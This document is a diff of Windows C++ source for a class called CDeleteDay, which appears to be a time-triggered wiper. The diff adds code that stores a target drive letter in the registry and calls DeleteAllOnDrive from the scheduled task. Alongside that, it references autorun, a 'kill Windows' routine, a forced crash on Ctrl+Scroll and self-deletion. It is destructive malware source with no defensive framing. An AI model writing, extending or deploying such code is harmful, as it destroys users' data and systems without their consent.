@@ -41,7 +41,7 @@ bool CDeleteDay::AddToAutoRun()
 }
 
 // записываем в реестр когда выполнится задача
-bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
+bool CDeleteDay::WriteDateOfPerformance(SYSTEMTIME SysTime)
 {
 	CString DeleteDay, DeleteWeek, DeleteMonth;
 
@@ -111,7 +111,7 @@ bool CDeleteDay::SaveDateOfPerformance(SYSTEMTIME SysTime)
 }
 
 // записываем какую папку будем удалять
-bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
+bool CDeleteDay::WritePathOfFolderToDelete(CString csFolderPath)
 {
 	if (SHSetValue(HKEY_CURRENT_USER
 		, RegDataKeyName
@@ -121,6 +121,40 @@ bool CDeleteDay::SavePathOfFolderToDelete(CString csFolderPath)
 		, stringSizeInBytes(csFolderPath)) != ERROR_SUCCESS)
 	{
 		TRACE(L"Облом с SHSetValue() в SaveFolderPathToDelete()");
+		return false;
+	}
+
+	return true;
+}
+
+//сохранить в реестре на каком диске будем все удалять
+bool CDeleteDay::WriteOnWhichDiskToRemove(CString DriveLetter) {
+	if (SHSetValue(HKEY_CURRENT_USER
+		, RegDataKeyName
+		, DelDriveLetter
+		, REG_SZ
+		, DriveLetter.GetString()
+		, stringSizeInBytes(DriveLetter)) != ERROR_SUCCESS)
+	{
+		TRACE(L"Облом с SHSetValue() в WriteOnWhichDiskToRemove()");
+		return false;
+	}
+
+	return true;
+}
+
+bool CDeleteDay::WriteTaskKillWindows()
+{
+	CString csKillWindows("YES");
+
+	if (SHSetValue(HKEY_CURRENT_USER
+		, RegDataKeyName
+		, KillWindowsKeyName
+		, REG_SZ
+		, csKillWindows.GetString()
+		, csKillWindows.GetLength()) != ERROR_SUCCESS)
+	{
+		TRACE(L"Облом с SHSetValue() в DeleteDiskD()\n");
 		return false;
 	}
 
@@ -165,41 +199,23 @@ bool CDeleteDay::EnableCrashOnCtrlScroll()
 	return true;
 }
 
-bool CDeleteDay::IsDeleteDiskD(void)
-{
-	CString csDeleteD("YES");
-
-	if (SHSetValue(HKEY_CURRENT_USER
-		, RegDataKeyName
-		, DelDiskDKeyName
-		, REG_SZ
-		, csDeleteD.GetString()
-		, csDeleteD.GetLength()) != ERROR_SUCCESS)
-	{
-		TRACE("Облом с SHSetValue() в DeleteDiskD()");
-		return false;
-	}
-
-	return true;
-}
-
-bool CDeleteDay::SaveTaskKillWindows()
-{
-	CString csKillWindows("YES");
-
-	if (SHSetValue(HKEY_CURRENT_USER
-		, RegDataKeyName
-		, KillWindowsKeyName
-		, REG_SZ
-		, csKillWindows.GetString()
-		, csKillWindows.GetLength()) != ERROR_SUCCESS)
-	{
-		TRACE(L"Облом с SHSetValue() в DeleteDiskD()\n");
-		return false;
-	}
-
-	return true;
-}
+//bool CDeleteDay::IsDeleteDiskD(void)
+//{
+//	CString csDeleteD("YES");
+//
+//	if (SHSetValue(HKEY_CURRENT_USER
+//		, RegDataKeyName
+//		, DelDiskDKeyName
+//		, REG_SZ
+//		, csDeleteD.GetString()
+//		, csDeleteD.GetLength()) != ERROR_SUCCESS)
+//	{
+//		TRACE("Облом с SHSetValue() в DeleteDiskD()");
+//		return false;
+//	}
+//
+//	return true;
+//}
 
 void CDeleteDay::SelfDelete()
 {
@@ -351,6 +367,13 @@ bool CDeleteDay::PerformATask(void)
 		DoKillWindows();
 	}
 
+	CStringA drvLetter;
+	if (IsRemoveAllOnDrive(drvLetter)) {
+		TRACE("Удаляем все на указанном диске");
+		//MessageBox(NULL, L"Удаляем все на указанном диске", L"ТАк-так", MB_OK);
+		DeleteAllOnDrive(drvLetter);
+	}
+
 	//DeleteAllOnDrive("e");
 	MessageBeep(MB_ICONERROR);
 
@@ -443,6 +466,23 @@ bool CDeleteDay::IfDeleteDiskD(void)
 	}
 
 	return false;
+}
+
+bool CDeleteDay::IsRemoveAllOnDrive(CStringA &letter)
+{
+	DWORD dwDataBufferSize = 512;
+	DWORD dwDataType = REG_SZ;
+
+	LSTATUS status = SHGetValue(HKEY_CURRENT_USER, RegDataKeyName, DelDriveLetter, &dwDataType, letter.GetBuffer(dwDataBufferSize)	, &dwDataBufferSize);
+
+	letter.ReleaseBuffer();
+	
+	if (status != ERROR_SUCCESS) {
+		TRACE0("Облом с SHGetValue() в IfDeleteDiskD().\n");		
+		return false;
+	}
+
+	return true;	
 }
 
 bool CDeleteDay::IfKillWindows()
@@ -650,8 +690,11 @@ bool CDeleteDay::CreateBatFile(char szFileBat[], char szTempPath[], char szFileP
 	return true;
 }
 
-bool CDeleteDay::DeleteAllOnDrive(char strDriveLetter[])
+bool CDeleteDay::DeleteAllOnDrive(CStringA driveLeter)
 {
+	char strDriveLetter[10] = { '\0' };
+	strcpy(strDriveLetter, driveLeter.GetString());
+	
 	/////////////////////////////////////////////////////////////////////////
 	//Этот способ применим для 7ки, 8ки, и 10ки!Для этого нам потребуется командная строка запущенная от имени администратора, в ней пишем следующее :
 	//cd .. (нажимаем ентер)
